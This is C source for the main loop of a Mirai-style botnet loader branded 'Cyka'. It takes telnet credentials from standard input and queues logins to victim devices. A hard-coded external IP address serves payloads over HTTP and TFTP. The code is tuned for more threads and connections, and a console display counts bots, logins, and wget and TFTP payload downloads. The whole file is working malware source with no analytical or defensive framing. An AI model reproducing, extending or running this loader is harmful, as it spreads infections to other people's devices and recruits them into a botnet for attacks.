#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <errno.h>

#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/binary.h"
#include "headers/util.h"
#include "headers/config.h"

static void *stats_thread(void *);

char *id_tag = "cyka";

static struct server *srv;

int main(int argc, char **args)
{
    pthread_t stats_thrd;
    uint8_t addrs_len;
    ipv4_t *addrs;
    uint32_t total = 0;
    struct telnet_info info;

    addrs_len = 1;
    addrs = calloc(4, sizeof(ipv4_t));
    addrs[0] = inet_addr("185.247.117.214");

	if (argc == 2)
    {
        id_tag = args[1];
    }
	
    if(!binary_init())
    {
        return 1;
    }

    // Cyka loader optimizations: 4x CPU cores and 128k connections
    int thread_count = sysconf(_SC_NPROCESSORS_ONLN) * 4;
    int max_connections = 1024 * 128;
    
    if((srv = server_create(thread_count, addrs_len, addrs, max_connections, HTTP_SERVER, HTTP_PORT, TFTP_SERVER)) == NULL)
    {
        return 1;
    }

    pthread_create(&stats_thrd, NULL, stats_thread, NULL);

    while(TRUE)
    {
        char strbuf[1024];

        if(fgets(strbuf, sizeof(strbuf), stdin) == NULL)
            break;

        util_trim(strbuf);

        if(strlen(strbuf) == 0)
        {
            usleep(10000);
            continue;
        }

        memset(&info, 0, sizeof(struct telnet_info));
        if(telnet_info_parse(strbuf, &info) == NULL)
        {
        }
        else
        {
            if(srv == NULL)
            {
            }

            server_queue_telnet(srv, &info);
            // Cyka optimization: reduced sleep frequency for faster processing
            if(total++ % 5000 == 0) usleep(100000); // 0.1 second instead of 1 second
        }

        ATOMIC_INC(&srv->total_input);
    }


    while(ATOMIC_GET(&srv->curr_open) > 0) sleep(1);

    return 0;
}

static void *stats_thread(void *arg)
{
    uint32_t seconds = 0;

    while(TRUE)
    {
        #ifndef DEBUG
        printf("\x1b[0;36m[\x1b[0;37m%ds\x1b[0;36m] \x1b[0;31mCYKA \x1b[0;37m- \x1b[0;35mBOTS: [\x1b[0;37m%d\x1b[0;36m] Logins: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m] Ran: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m] \x1b[0;37m-> Echoes: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m] Wgets: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m] TFTPs: \x1b[0;36m[\x1b[0;37m%d\x1b[0;36m]\x1b[0;37m\n",
               seconds++, ATOMIC_GET(&srv->curr_open), ATOMIC_GET(&srv->total_logins), ATOMIC_GET(&srv->total_successes),
               ATOMIC_GET(&srv->total_echoes), ATOMIC_GET(&srv->total_wgets), ATOMIC_GET(&srv->total_tftps));
        #endif
        
        // Log performance metrics every 10 seconds
        if (seconds % 10 == 0) {
            log_performance_metrics(srv);
        }
        
        fflush(stdout);
        sleep(1);
    }
}
